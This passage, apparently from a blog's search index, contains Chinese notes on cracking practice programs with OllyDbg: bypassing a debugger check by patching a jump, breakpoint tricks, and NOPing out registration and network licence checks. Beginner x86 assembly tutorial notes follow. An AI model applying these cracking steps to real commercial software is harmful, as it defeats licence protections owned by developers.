ReverseM.00401106\n00401105  |. C3             RETN\n00401106  \\> FFE0           JMP EAX\n;跳到内存00000001位置，不是程序领空\n00401108   . E8 01000000    CALL ReverseM.0040110E\n0040110D   . C3             RETN\n```\n\n又是改je就可。\n\n## 32. 实验十九 Debugger Detected\n\n{% asset_img 实验19.png 实验19 %}\n\n这个连英文原版OD都可以逃过检测，那还是用回熟悉的OD来调试它吧。\n\n这个程序在没有调试器开启的情况下就会显示上图，但它如果探测到调试器启动时，它会弹窗“Your debugger is detected!”\n\n将它载入OD，遇到问题下断点跟进，但一进去是DLL领空，Alt+F9出不来，一直在DLL领空循环。搜索一下我们要进去的API函数`DialogBoxParamA`(其实API函数可以不跟进，因为调用的全都是dll领空里面的内容)\n\n### 32.1 DialogBoxParam\n\n```c\nint DialogBoxParam(\n    HINSTANCE hInstance,//标识一个模块的实例，该模块的可执行文件含有对话框模板\n    LPCTSTR IpTemplateName,//标识对话框模板\n    HWND hWndParent,//指定拥有对话框的窗口\n    DLGPROC IPDialogFunc,//指向对话框过程的指针\n    LPARAM dwlnitParam//指定传递到对话框过程中的 WM_INITDIALOG 消息 IParam 参数的值\n);\n```\n\n也就是说`IPDialogFunc`指向的地址就是实现函数的过程。\n\n```asm\n0040106C  |.  6A 00         push 0x0                                 ; /lParam = NULL\n0040106E  |.  68 8C104000   push Debugger.0040108C                   ; |DlgProc = Debugger.0040108C\n00401073  |.  6A 00         push 0x0                                 ; |hOwner = NULL\n00401075  |.  68 04304000   push Debugger.00403004                   ; |pTemplate = \"KeyGenDialog\"\n0040107A  |.  FF35 CC344000 push dword ptr ds:[0x4034CC]             ; |hInst = 00400000\n00401080  |.  E8 C9030000   call <jmp.&user32.DialogBoxParamA>       ; \\DialogBoxParamA\n```\n\n指向0040108C，所以这个地址就是我们要找的地方。在函数入口处下断点，试运行，又回到了这个断点处，说明这个函数被调用了两次。第一次jnz跳过，第二次jnz不跳过。\n\n```asm\n0040108C  /.  55            push ebp\n0040108D  |.  8BEC          mov ebp,esp\n0040108F  |.  53            push ebx\n00401090  |.  817D 0C 10010>cmp [arg.2],0x110\n00401097  |.  75 3B         jnz short Debugger.004010D4\n00401099  |.  74 01         je short Debugger.0040109C\n0040109B  |.  CC            int3\n0040109C  |>  8BC0          mov eax,eax                              ;  Debugger.0040108C\n0040109E  |.  E8 28010000   call Debugger.004011CB\n```\n\n去到0040109E处弹出错误，跟进函数。\n\n```asm\n004011CB  /$  55            push ebp\n004011CC  |.  8BEC          mov ebp,esp\n004011CE  |.  81C4 D4FEFFFF add esp,-0x12C\n004011D4  |.  53            push ebx\n004011D5  |.  56            push esi\n004011D6  |.  57            push edi                                 ;  Debugger.0040304C\n004011D7  |.  6A 00         push 0x0                                 ; /ProcessID = 0x0\n004011D9  |.  6A 0F         push 0xF                                 ; |Flags = TH32CS_SNAPALL\n004011DB  |.  E8 3E020000   call <jmp.&kernel32.CreateToolhelp32Snap>; \\CreateToolhelp32Snapshot\t\t创建进程快照\n004011E0  |.  8945 FC       mov [local.1],eax\n004011E3  |.  8DB5 D4FEFFFF lea esi,[local.75]\n004011E9  |.  8D3D 4C304000 lea edi,dword ptr ds:[0x40304C]\n004011EF  |.  56            push esi                                 ; /lppe\n004011F0  |.  FF75 FC       push [local.1]                           ; |hSnapshot = 00000258\n004011F3  |.  E8 38020000   call <jmp.&kernel32.Process32First>      ; \\Process32First\n004011F8  |.  85C0          test eax,eax\n004011FA  |.  74 2B         je short Debugger.00401227\n004011FC  |.  8D46 24       lea eax,dword ptr ds:[esi+0x24]\n004011FF  |.  50            push eax                                 ; /String2 = 00000258 ???\t\t获取第一个进程名字\n00401200  |.  57            push edi                                 ; |String1 = \"OLLYDBG.EXE\"\n00401201  |.  E8 3C020000   call <jmp.&kernel32.lstrcmpiA>           ; \\lstrcmpiA\t\t\t\t\t与OLLYDBG.EXE对比\n00401206  |.  85C0          test eax,eax\n00401208  |.  74 2A         je short Debugger.00401234\n;如果进程名字有OLLYDBG.EXE则弹框说Your debugger is detected !!!\n0040120A  |>  56            /push esi                                ; /lppe\n0040120B  |.  FF75 FC       |push [local.1]                          ; |hSnapshot = 00000258\n0040120E  |.  E8 23020000   |call <jmp.&kernel32.Process32Next>      ; \\Process32Next\n00401213  |.  85C0          |test eax,eax\n00401215  |.  74 10         |je short Debugger.00401227\n00401217  |.  8D46 24       |lea eax,dword ptr ds:[esi+0x24]\n0040121A  |.  50            |push eax                                ; /String2 = 00000258 ???\t\t获取除第一个进程的名字\n0040121B  |.  57            |push edi                                ; |String1 = \"OLLYDBG.EXE\"\n0040121C  |.  E8 21020000   |call <jmp.&kernel32.lstrcmpiA>          ; \\lstrcmpiA\t\t\t\t\t与OLLYDBG.EXE对比\n00401221  |.  85C0          |test eax,eax\n00401223  |.  74 0F         |je short Debugger.00401234\n;如果进程名字有OLLYDBG.EXE则弹框说Your debugger is detected !!!\n00401225  |.^ EB E3         \\jmp short Debugger.0040120A\n00401227  |>  FF75 FC       push [local.1]                           ; /hObject = 00000258\n0040122A  |.  E8 E9010000   call <jmp.&kernel32.CloseHandle>         ; \\CloseHandle\n0040122F  |.  5F            pop edi                                  ;  0019F9B0\n00401230  |.  5E            pop esi                                  ;  0019F9B0\n00401231  |.  5B            pop ebx                                  ;  0019F9B0\n00401232  |.  C9            leave\n00401233  |.  C3            retn\n00401234  |>  6A 10         push 0x10                                ; /Style = MB_OK|MB_ICONHAND|MB_APPLMODAL\n00401236  |.  68 11304000   push Debugger.00403011                   ; |Title = \"Debugger Detected tutorial    \"\n0040123B  |.  68 58304000   push Debugger.00403058                   ; |Text = \"Your debugger is detected !!!\"\n00401240  |.  FF75 08       push [arg.1]                             ; |hOwner = 00000001\n00401243  |.  E8 24020000   call <jmp.&user32.MessageBoxA>           ; \\MessageBoxA\n00401248  |.  50            push eax                                 ; /ExitCode = 0x258\n00401249  \\.  E8 D6010000   call <jmp.&kernel32.ExitProcess>         ; \\ExitProcess\n```\n\n代码分析得很清楚了，在调用`CreateToolhelp32Snapshot`函数的时候会拍一张快照，记录本机所有的进程，再将所有的进程名字与`OLLYDBG.EXE`对比，如果相同则弹窗有调试器。\n\n破解也很简单，直接绕过0040109E处，改上面的跳转指令即可。\n\n```asm\n00401097  |.  75 3B         jnz short Debugger.004010D4\n修改为\n00401097     /EB 3B         jmp short Debugger.004010D4\n```\n\n## 33. 万能断点特征码\n\n如果字符串，API函数都不管用，可试试万能断点特征码。\n\n```\nF3 A5 8B C8 83 E1 03 F3 A4 E8\n```\n\n在需要操作前的那一刻下断，比如想要输入注册码后点击按钮后可以断下，就先输入好注册码，再下断，再点击按钮。如果先下断再输入注册码，在输入注册码时，就会断下。\n\nXP系统可用，Win10未知是否可行。\n\n## 34. 不算总结的总结\n\n这些总结都是看Shark恒的逆向教程扫盲扫出来的，我手上也没那么多程序一个个过，所以不懂的话就去看Shark恒的视频，一个视频就10分钟左右，花不了多长时间。\n\n### 34.1 BC++和Delphi\n\nBC++和Delphi都可以使用DeDe(DelphiDecompiler)查看按钮事件(点击按钮后运行的程序地址)。\n\nBC++需要手动修复IAT，在OEP最近的一个call进去，发现全是jmp系统函数，找到第一个jmp系统函数右键，数据窗口跟随，取第一个系统函数的偏移地址作为IAT首地址，大小取1000，将无效指针剪切掉即可。\n\n[Shark恒逆向教程 BC++假自校验](https://www.bilibili.com/video/BV1cw411Z7Ab?p=18)\n\n[Shark恒逆向教程 DephiDecompiler用法](https://www.bilibili.com/video/BV1cw411Z7Ab?p=19)\n\n### 34.2 易语言\n\n用易语言编写的软件可以用push窗体法，易语言按钮事件FF 55 FC 5F 5E，窗体事件FF 25。Ctrl+G去到易语言窗体事件处，附近有个push xxxx，这个就是第一个展示在屏幕的窗口的指令。程序有多个窗体事件，我们的目的就是将我们需要的窗体事件的地址粘贴到那个push里，让它执行我们想要的窗体。Ctrl+F查找命令 push 10001，往下数第二行就是push 窗体事件的地址，将指令复制粘贴到FF25处附近的push xxxx。保存文件。如果不是我们想要的窗体，继续Ctrl+L查找下一个，重复上面操作，直至找到我们想要的窗口。但这种方法容易触发暗桩，比如蓝屏，关机等，所以慎用！\n\n[Shark恒逆向教程 push窗体法](https://www.bilibili.com/video/BV1cw411Z7Ab?p=23)\n\n### 34.3 VB\n\nVB写的程序，如果这个程序很大，手动下按钮事件可能非常多，所以可以用脚本帮我们下按钮事件断点。如果是重启验证类的软件，要注意程序还没打开就停在断点处的断点，找到是否有cmp ax,0xFFFF，这个直接影响下面的关键跳，所以一定要注意。也就是为什么不能修改返回值为1，因为它是与0xFFFF比较的。如果有些地方还显示未注册，说明有其它跳转到未注册处，搜索命令cmp ax,0xFFFF下断一个个判断，直至全显示已注册。\n\n[Shark恒逆向教程 VB通用技巧](https://www.bilibili.com/video/BV1cw411Z7Ab?p=26)\n\n如果VB程序打开后自动退出，可以查找所有模块间的调用，找退出程序的函数。VB的退出程序函数是`__vbaEnd`。如果程序含有暗桩，可以看 [Shark恒逆向教程 取消关机暗桩](https://www.bilibili.com/video/BV1cw411Z7Ab?p=27) 。\n\n### 34.4 重启验证类程序\n\n重启验证类型的软件改关键跳不管用，因为每次重启都要检验注册码，如果注册码不对还是要重新注册，所以要进入到关键call找到注册码或破解。\n\n### 34.5 网络验证类程序\n\n如果运行到某处卡住，可能在进行网络验证，将这个call指令nop掉，再将紧接着的跳转指令也nop掉。\n\n### 34.6 快速定位的小技巧\n\n载入OD运行，输入假码后弹出提示框，此时回到OD暂停，Alt+F9返回到用户代码，回到程序点击提示框按钮，OD成功回到用户代码。点击暂停后也可以用调用堆栈的方法回到用户代码。\n\n[Shark恒逆向教程 暂停法找注册码](https://www.bilibili.com/video/BV1cw411Z7Ab?p=21)\n\n### 34.7 关于OD的琐碎小知识\n\n如果在OD鼠标与选中行不一致，可以Ctrl + A分析，就正常了。\n\n去除花指令：插件 -> E Junk Code -> MainDlg，VA是执行到花指令的地方，大小改999就行。\n\n# 二、x64dbg\n\n1. 字符串搜索：CPU(反汇编)窗口->鼠标右键->搜索->选择模块(根据个人需求选择，一般选择当前模块，前提是得先执行到主模块)->字符串\n2. 用space改汇编语言\n3. 保存修改到文件：反汇编窗口右键->补丁->修补文件\n\n","categories":["Windows逆向"],"tags":["OllyDbg","x64dbg"]},{"title":"x86汇编基础","url":"/posts/de6e58e0.html","content":"\n很久之前看王爽老师的《汇编语言》写的笔记，可能不太准确，先做个存档吧。\n\n<!--more-->\n\n# 1. 基础知识\n\n汇编指令是机器指令的助记符，同机器指令一一对应。\n\n每一种CPU都有自己的汇编指令集。\n\nCPU可以直接使用的信息在存储器中存放。\n\n指令和数据没有任何区别，都是二进制信息。\n\n存储单元从零开始顺序编号。\n\n存储器的存储单元可以存储1B，即8个二进制位。微机存储器的容量是以**字节**为最小单位来计算的。\n\n1B=8b, 1KB=1024B, 1MB=1024KB, 1GB=1024MB, 1TB=1024GB\n\n地址总线：\n\n- CPU是通过地址总线来指定存储单元的\n- 地址总线上能传送多少个不同的信息，CPU就可以对多少个存储单元进行寻址\n- 一个CPU有N根地址线，则可以说这个CPU的地址总线的宽度为N，这样的CPU最多可以寻找2的N次方个内存单元(B)\n\n数据总线：\n\n- CPU与内存或其他器件之间的数据传送是通过数据总线来进行的\n- 数据总线的宽度决定了CPU和外界的数据传送速度，8根数据总线一次可传送一个8位二进制数据(即1B)\n\n控制总线：\n\n- CPU对外部器件的控制是通过控制总线来进行的\n- 有多少根控制总线就意味着CPU提供了对外部器件的多少种控制\n- 控制总线的宽度决定了CPU对外部器件的控制能力\n\n# 2. 寄存器\n\n内部总线实现CPU内部各个器件之间的连接，外部总线实现CPU和主板上其他器件的联系。\n\n## 2.1 通用寄存器\n\nAX, BX, CX, DX\n\n以AX为例，数据18，二进制表示10010，小端序\n\n|      |      |      |      |      |      |      | AX   |      |      |      |      |      |      |      |      |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| 15   | 14   | 13   | 12   | 11   | 10   | 9    | 8    | 7    | 6    | 5    | 4    | 3    | 2    | 1    | 0    |\n| 0    | 0    | 0    | 0    | 0    | 0    | 0    | 0    | 0    | 0    | 0    | 1    | 0    | 0    | 1    | 0    |\n|      |      | 8~15 | AH   |      |      |      |      |      |      |      | 0~7  | AL   |      |      |      |\n\nAH和AL可以看成是一个字型数据的高8位和低8位，也可以看成是两个独立的字节型数据。\n\n## 2.2 几条汇编指令\n\n![汇编指令举例](F:\\markdown图片\\汇编语言\\汇编指令举例.png)\n\n汇编指令不区分大小写。\n\n原AX=0000H，BX=0000H\n\n| 程序段中的指令 | 指令执行后AX中的数据 | 指令执行后BX中的数据 |\n| -------------- | -------------------- | -------------------- |\n| mov ax, 4E20H  | 4E20H                | 0000H                |\n| add ax, 1406H  | 6226H                | 0000H                |\n| mov bx, 2000H  | 6226H                | 2000H                |\n| add ax, bx     | 8226H                | 2000H                |\n| mov bx, ax     | 8226H                | 8226H                |\n| add ax, bx     | **044CH**            | 8226H                |\n\n## 2.3 物理地址\n\n```\n物理地址=段地址×16+偏移地址=基础地址+偏移地址\n```\n\nCPU可以用不同的段地址和偏移地址形成同一个物理地址。\n\n偏移地址16位，变化范围0~FFFFH，仅用偏移地址来寻址最多可寻$2^{16}B=2^{6}KB=64KB$个内存单元。\n\n## 2.4 CS 和 IP\n\nCS为代码段寄存器(存放段地址)，IP为指令指针寄存器(存放偏移地址)。\n\n同时修改CS、IP的内容：jmp 段地址：偏移地址\n\n```\njmp 3:0B16\t执行后：CS=0003H,IP=0B16H,CPU将从00030H+0B16H=00B46H处读取指令\n```\n\n仅修改IP的内容：jmp 某一合法寄存器\n\n```\njmp ax\t执行指令前：ax=1000H,CS=2000H,IP=0003H\n\t\t执行指令后：ax=1000H,CS=2000H,IP=1000H\n```\n\n8086CPU工作过程：\n\n1. 从CS:IP指向的内存单元读取指令，读取的指令进入指令缓冲器\n2. IP指向下一条指令\n3. 执行指令（转到1，重复）\n\n# 3. 内存访问\n\n字单元：存放一个字型数据(16位)的内存单元，由两个地址连续的内存单元组成。高地址内存单元中存放字型数据的高位字节，低地址内存单元中存放字型数据的低位字节。\n\n起始地址为N的字单元简称为N地址字单元。比如一个字单元由2、3两个内存单元组成，则这个字单元的起始地址为2。\n\n## 3.1 DS 和 [address]\n\nDS为数据段寄存器(存放段地址)，[address]表示一个内存单元(存放偏移地址)。\n\n## 3.2 mov指令(add、sub指令同)\n\n1. 将数据直接送入寄存器：mov 寄存器，数据\n2. 将一个寄存器中的内容送人另一个寄存器：mov 寄存器，寄存器\n\n3. 将一个内存单元中的内容送入一个寄存器中：mov 寄存器，内存单元地址\n\n```asm\n将10000H(1000:0)中的数据读到al中:\nmov bx, 1000H\nmov ds, bx\nmov al, [0]\n```\n\n4. mov 内存单元，寄存器\n5. mov 段寄存器，寄存器\n\n8086CPU不支持将数据直接送入段寄存器的操作，ds是一个段寄存器，所以`mov ds,1000H`这条指令是非法的，只好用一个寄存器来进行中转，即先将1000H送入一个通用寄存器，再将通用寄存器的内容送入ds。\n\n```asm\n将al中的数据送入内存单元10000H中:\nmov bx, 1000H\nmov ds, bx\nmov [0], al\n```\n\n## 3.3 CPU提供的栈机制\n\n```asm\npush ax 表示将寄存器ax中的数据送入栈中\npop ax \t表示从栈顶取出数据送入ax\n```\n\n8086CPU的入栈和出栈操作都是以字为单位进行的。\n\nCPU如何知道栈顶位置？SS:SP，任意时刻，SS:SP指向栈顶元素。\n\npush ax由以下两步完成：\n\n1. SP=SP-2，SS:SP指向当前栈顶前面的单元，以当前栈顶前面的单元为新的栈顶\n2. 将ax中的内容送入SS:SP指向的内存单元处，SS:SP此时指向新栈顶\n\npop ax由以下两步完成：\n\n1. 将SS:SP指向的内存单元处的数据送入ax中\n2. SP=SP+2，SS:SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶\n\n## 3.4 push指令(pop指令同)\n\n1. 将一个寄存器中的数据入栈：push 寄存器\n2. 将一个段寄存器中的数据入栈：push 段寄存器\n3. 将一个内存字单元处的字入栈：push 内存单元\n\n指令执行时，CPU要知道内存单元的地址，可以在push、pop指令中只给出内存单元的偏移地址，段地址在指令执行时，CPU从DS中取得。\n\n```asm\nmov ax,1000H\nmov ds,ax\npush [0]\t\t;将1000:0处的字压入栈\npop [2]\t\t\t;出栈的数据送入1000:2处\n```\n\n将10000H~1000FH这段空间当作栈，初始状态栈是空的，将ax, bx, DS中的数据入栈。\n\n```asm\nmov ax,1000H\nmov ss,ax\t\t;设置栈的段地址\nmov sp,0010H\t;设置栈的偏移地址,因栈为空,所以sp=000FH+0002H=0010H\npush ax\npush bx\npush ds\n```\n\npush、pop等栈操作指令，修改的只是SP。也就是说，栈顶的变化范围最大为0~FFFFH\n\n一个栈段的容量最大为64KB。\n\n在10000H处写入字型数据2266H\n\n```asm\n方法一\nmov ax,1000H\nmov ds,ax\nmov ax,2266H\nmov [0],ax\n\n方法二\nmov ax,1000H\nmov ss,ax\nmov sp,2\nmov ax,2266H\npush ax\n```\n\n## 3.5 段的综述\n\n对于数据段，将它的段地址放在DS中，用mov、add、sub等访问内存单元的指令时，CPU就将我们定义的数据段中的内容当作数据来访问。\n\n对于代码段，将它的段地址放在CS中，将段中第一条指令的偏移地址放在IP中，这样CPU就将执行我们定义的代码中的指令。\n\n对于栈段，将它的段地址放在SS中，将栈顶单元的偏移地址放在SP中，这样CPU在需要进行栈操作的时候，比如执行push、pop指令等，就将我们定义的栈段当作栈空间来用。\n\nCPU将内存中的某段内容当作代码，是因CS:IP指向了那里；CPU将某段内存当作栈，是因为SS:SP指向了那里。\n\n# 4. 第一个程序\n\n```asm\nassume cs:codesg\n\ncodesg segment\n\nmov ax,0123H\nmov bx,0456H\nadd ax,bx\nadd ax,ax\n\nmov ax,4c00H\nint 21H\n\ncodesg ends\n\nend\n```\n\n在汇编语言程序中包含两种指令：伪指令、汇编指令。汇编指令是有对应的机器码的指令，可以被编译为机器指令，最终为CPU所执行。伪指令没有对应的机器指令，最终不被CPU执行。伪指令是由编译器来执行的指令，编译器根据伪指令来进行相关的编译工作。\n\n## 4.1 伪指令\n\n### 4.1.1 XXX segment …… XXX ends\n\nsegment和ends的功能是定义一个段，segment说明一个段开始，ends说明一个段结束。\n\n一个有意义的汇编程序中至少要有一个段，这个段用来存放代码。\n\n### 4.1.2 end\n\nend是一个汇编程序的结束标记，编译器在编译汇编程序的过程中，如果碰到了伪指令end，就结束对源程序的编译。\n\n### 4.1.3 assume\n\n这条伪指令的含义为“假设”，它假设某一段寄存器和程序中的某一个用segment...ends定义的段相关联。通过assume说明这种关联，在需要的情况下，编译程序可以将段寄存器和某一个具体的段相联系。\n\n## 4.2 汇编指令\n\n## 4.3 标号\n\n一个标号指代了一个地址，比如“codesg”。codesg在segment前面，作为一个段的名称，这个段的名称最终将被编译、连接程序处理为一个段的段地址。\n\n## 4.4 程序的结构\n\n编程运算$2^3$\n\n1. 定义一个段，名称为abc\n\n```asm\nabc segment\nabc ends\n```\n\n2. 在这个段中写入汇编指令，来实现我们的任务\n\n```asm\nabc segment\nmov ax,2\nadd ax,ax\nadd ax,ax\nabc ends\n```\n\n3. 指出程序要在何处结束\n\n```asm\nabc segment\nmov ax,2\nadd ax,ax\nadd ax,ax\nabc ends\nend\n```\n\n4. abc被当作代码段来用，所以应该将abc和cs联系起来\n\n```asm\nassume cs:abc\nabc segment\nmov ax,2\nadd ax,ax\nadd ax,ax\nabc ends\nend\n```\n\n5. 程序返回\n\n```asm\nassume cs:abc\nabc segment\nmov ax,2\nadd ax,ax\nadd ax,ax\nmov ax,4c00H\nint 21H\nabc ends\nend\n```\n\n6. 语法错误和逻辑错误\n\n## 4.5 编译\n\n源程序文件.asm->目标文件.obj\n\n## 4.6 连接\n\n目标文件.obj->可执行文件.exe\n\n# 5. [bx]和loop指令\n\n[bx]同样表示一个内存单元，它的偏移地址在bx中。\n\n“()”中的元素可以有3种类型：①寄存器名；②段寄存器名；③内存单元的物理地址。\n\n(ax)表示ax中的内容，(20000H)表示内存20000H单元的内容，((ds)*16+(bx))表示ds中的内容为ADR1，bx中的内容为ADR2，内存ADR1\\*16+ADR2单元的内容，即内存ADR1:ADR2单元的内容。\n\n约定idata表示常量。\n\n```\nmov ax,[idata]\nmov ax,idata\n```\n\n```\nmov ax,[bx]\t\t;(ax)=((ds)*16+(bx))\nmov [bx],ax\t\t;((ds)*16+(bx))=(ax)\n```\n\n```\ninc bx\t\t\t;inc bx的含义是bx中的内容加1\n```\n\n## 5.1 loop指令\n\nloop指令的格式：loop 标号\n\nCPU执行loop指令的时候要进行两步操作：\n\n1. (cx)=(cx)-1\n2. 判断cx中的值，不为零则转至标号处执行程序，为零则向下执行\n\n编程运算$2^{12}$\n\n```asm\nassume cs:code\ncode segment\n\tmov ax,2\n\tmov cx,11\ns:\tadd ax,ax\n\tloop s\n\tmov ax,4c00H\n\tint 21H\ncode ends\nend\n```\n\ncx和loop指令相配合实现循环功能：①在cx中存放循环次数；②loop指令中的标号所标识地址要在前面；③要循环执行的程序段，要写在标号和loop指令的中间。\n\n**在汇编源程序，数据不能以字母开头**，所以要在前面加0。`A000H`在汇编源程序中要写为`0A000H`。\n\n```asm\nmov al,[0]\t\t;(al)=0,将常量0送入al中(mov al,0含义相同)\nmov al,ds:[0]\t;(al)=((ds)*16+0),将内存单元中的数据送入al中\nmov al,[bx]\t\t;(al)=((ds)*16+(bx)),将内存单元中的数据送入al中\nmov al,ds:[bx]\t;与mov al,[bx]含义相同\n```\n\n（1）在汇编源程序中，如果用指令访问一个内存单元，则在指令中必须用”[]“来表示存储单元，如果在”[]“里用一个常量idata直接给出内存单元的偏移地址，就要在”[]“的前面显式地给出段地址所在的寄存器。比如`mov al,ds:[0]`\n\n如果没有在”[]“的前面显式地给出段地址所在的段寄存器，那么编译器会把指令中的[idata]解释为data，比如`mov al,[0]`\n\n（2）如果在”[]“里用寄存器，比如bx，间接给出内存单元的偏移地址，则段地址默认在ds中。当然也可以显式地给出段地址所在的段寄存器。\n\n## 5.2 一段安全的空间\n\n我们需要直接向一段内存中写入内容，这段内存空间不应存放系统或其他程序的数据或代码，否则写入操作很可能引发错误。DOS方式下，一般情况，0:200~0:2ff空间中没有系统或其他程序的数据或代码。\n\n## 5.3 loop和[bx]的联合应用\n\n在循环中，源始单元ffff:X和目标单元0020:X的偏移地址X是变量，可以用bx来存放。\n\n## 5.4 段前缀\n\n![段前缀](F:\\markdown图片\\汇编语言\\段前缀.PNG)\n\n# 6. 包含多个段的程序\n\n```asm\nassume cs:code\ncode segment\n\tdw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h\n\tmov bx,0\n\tmov ax,0\n\t\n\tmov cx,8\ns:add ax,cs:[bx]\n\tadd bx,2\n\tloop s\n\t\n\tmov ax,4c00h\n\tint 21h\ncode ends\nend\n```\n\ndw即define word，定义字型数据。\n\n程序在运行的时候CS中存放代码段的段地址，所以可以从CS中得到它们的段地址。dw定义的数据处于代码段的最开始，所以偏移地址为0，这8个数据就在代码段的偏移0、2、4、6、8、A、C、E处。程序运行时，它们的地址就是cs:0, cs:2, cs:4, cs:6, cs:8, cs:a, cs:c, cs:e。\n\nend除了通知编译器程序结束外，还可以通知编译器程序的入口在什么地方。`end 标号`\n\n```asm\nassume cs:code\ncode segment\n\tdw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h\nstart:\tmov bx,0\t\t;程序的第一条指令\n\t\tmov ax,0\n\t\n        mov cx,8\n    s:add ax,cs:[bx]\n        add bx,2\n        loop s\n\n        mov ax,4c00h\n        int 21h\ncode ends\nend start\n```\n\n## 6.1 在代码段中使用栈\n\n程序运行时，定义的数据存放在cs:0\\~cs:F单元中，共8个字单元。依次将这8个字单元中的数据入栈，然后再依次出栈到这8个字单元中，从而实现数据的逆序存放。（将cs:10\\~cs:2F的内存空间当作栈来用）\n\n```asm\nassume cs:codesg\ncodesg segment\n\tdw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h\n\tdw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\n\t\t\t;用dw定义16个字型数据，在程序加载后，将取得16个字的内存空间存放这16个数据\n\t\t\t;在后面的程序中将这段空间当作栈来使用\nstart:\tmov ax,cs\n\t\tmov ss,ax\n\t\tmov sp,30h\t\t;将设置栈顶ss:sp指向cs:30\n\t\t\n\t\tmov bx,0\n\t\tmov cx,8\ns:\t\tpush cs:[bx]\n\t\tadd bx,2\n\t\tloop s\t\t\t;将代码段0~15单元中的8个字型数据依次入栈\n\t\t\n\t\tmov bx,0\n\t\tmov cx,8\ns0:\t\tpop cs:[bx]\n\t\tadd bx,2\n\t\tloop s0\t\t\t;出栈8个字型数据到代码段0~15单元中\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncodesg ends\nend start\t\t\t\t;指明程序的入口在start处\n```\n\n## 6.2 将数据、代码、栈放入不同的段\n\n在前面的内容中，我们在程序中用到了数据和栈，将数据、栈和代码都放到了一个段里面。我们在编程的时候要注意何处是数据，何处是栈，何处是代码。这样做会产生两个问题：\n\n1. 把它们放到一个段中使程序显得混乱\n2. 前面数据中处理的数据很少，用到的栈空间也小，加上没有多长的代码，放到一个段里面没有问题。但如果数据、栈、代码需要的空间超过64KB，就不能放在一个段中（8086模式中一个段的容量不能大于64KB）\n\n```asm\nassume cs:code,ds:data,ss:stack\ndata segment\n\tdw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h\ndata ends\nstack segment\n\tdw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\nstack ends\ncode segment\nstart:\tmov ax,stack\t;将名为stack段的段地址送入ax\n\t\tmov ss,ax\n\t\tmov sp,20h\t\t\n;设置栈顶ss:sp指向stack:20(在整个程序中是cs:30,但在栈段是从0:10~0:2F,所以是stack:20)\n\t\tmov ax,data\n\t\tmov ds,ax\t\t;ds指向data段\n\t\tmov bx,0\t\t;ds:bx指向data段中的第一个单元\n\t\t\n\t\tmov cx,8\ns:\t\tpush [bx]\n\t\tadd bx,2\n\t\tloop s\t\t\t;将data段中的0~15单元中的8个字型数据依次入栈\n\t\t\n\t\tmov cx,8\ns0:\t\tpop [bx]\n\t\tadd bx,2\n\t\tloop s0\t\t\t;依次出栈8个字型数据到data段的0~15单元中\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncode ends\nend start\n```\n\n# 7. 更灵活的定位内存地址的方法\n\n## 7.1 and和or指令\n\n```asm\nand指令:逻辑与指令，按位进行与运算(1and1=1,1and0=0,0and0=0)\nmov al,01100011B\nand al,00111011B\n执行后:al=00100011B\n\nor指令:逻辑或指令，按位进行或运算(1or1=1,1or0=1,0or0=0)\nmov al,01100011B\nor al,00111011B\n执行后:al=01111011B\n```\n\n## 7.2 ASCII码\n\n```\na->61h,b->62h\n```\n\n## 7.3 以字符形式给出的数据\n\n在汇编程序中，用''的方式指明数据是以字符的形式给出的，编译器将它们转化为相对应的ASCII码。\n\n```asm\nassume cs:code,ds:data\ndata segment\n\tdb 'unIX'\n\tdb 'foRK'\ndata ends\ncode segment\nstart:\tmov al,'a'\n\t\tmov bl,'b'\n\t\tmov ax,4c00h\n\t\tint 21h\ncode ends\nend start\n```\n\n## 7.4 大小写转换的问题\n\n在codesg中填写代码，将tadasg中的第一个字符串转化为大写，第二个字符串转化为小写。\n\n![ASCII二进制十六进制](F:\\markdown图片\\汇编语言\\ASCII二进制十六进制.jpg)\n\n方法一：小写字母的ASCII码值比大写字母的ASCII码值大20H。\n\n```asm\nassume cs:codesg,ds:datasg\ndatasg segment\n\tdb 'BaSiC'\n\tdb 'iNfOrMaTiOn'\ndatasg ends\ncodesg segment\nstart:\tmov ax,datasg\n\t\tmov ds,ax\n\t\tmov bx,0\n\t\tmov cx,5\n\ts:\tmov al,[bx]\n\t\t如果(al)>61H,则为小写字母的ASCII码,则:sub al,20h\n\t\tmov [bx],al\n\t\tinc bx\n\t\tloop s\ncodesg ends\nend start\n```\n\n方法二：大写字母的第6位全为0，小写字母的第6位全为1。\n\n```asm\nassume cs:codesg,ds:datasg\ndatasg segment\n\tdb 'BaSiC'\n\tdb 'iNfOrMaTiOn'\ndatasg ends\ncodesg segment\nstart:\tmov ax,datasg\n\t\tmov ds,ax\t\t;设置ds指向datasg段\n\t\tmov bx,0\t\t;设置(bx)=0,ds:bx指向'BaSiC'的第一个字母\n\t\tmov cx,5\n\ts:\tmov al,[bx]\t\t;将ASCII码从ds:bx所指向的单元中取出\n\t\tand al,11011111B;将al中的ASCII码的第6位置0,变为大写字母\n\t\tmov [bx],al\n\t\tinc bx\n\t\tloop s\n\t\t\n\t\tmov bx,5\t\t;设置(bx)=5,ds:bx指向'iNfOrMaTiOn'的第一个字母\n\t\tmov cx,11\n\ts0: mov al,[bx]\n\t\tor al,00100000B\n\t\tmov [bx],al\n\t\tinc bx\n\t\tloop s0\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncodesg ends\nend start\n```\n\n## 7.5 [bx+idata]\n\n[bx+idata]表示一个内存单元，它的偏移地址为(bx)+idata\n\nmov ax,[bx+200]->(ax)=((ds)*16+(bx)+200)\n\n简化7.4方法二(但这个一定要两个字符串长度相同)\n\n```asm\n    mov ax,datasg\n    mov ds,ax\n    mov bx,0\n\n    mov cx,5\ns:\tmov al,[bx]\t\t;定位第一个字符串中的字符\n\tand al,11011111b\n\tmov [bx],al\n\tmov al,[5+bx]\t;定位第二个字符串中的字符\n\tor al,00100000b\n\tmov [5+bx],al\n\tinc bx\n\tloop s\n```\n\n[bx]=0[bx]，[5+bx]=5[bx]\n\n## 7.6 SI 和 DI\n\nsi 和 